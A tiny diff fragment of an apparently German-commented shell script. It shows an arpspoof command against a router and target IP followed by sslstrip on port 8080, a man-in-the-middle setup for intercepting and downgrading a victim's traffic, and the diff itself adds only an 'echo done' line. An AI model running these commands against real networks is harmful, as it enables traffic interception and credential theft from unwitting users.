@@ -23,3 +23,4 @@ arpspoof -i eth0 -r -t $RouterIP $TargetIP &
 
 #arpspoofing mit ssl strip kombinieren
 sslstrip -l 8080
+echo "done"
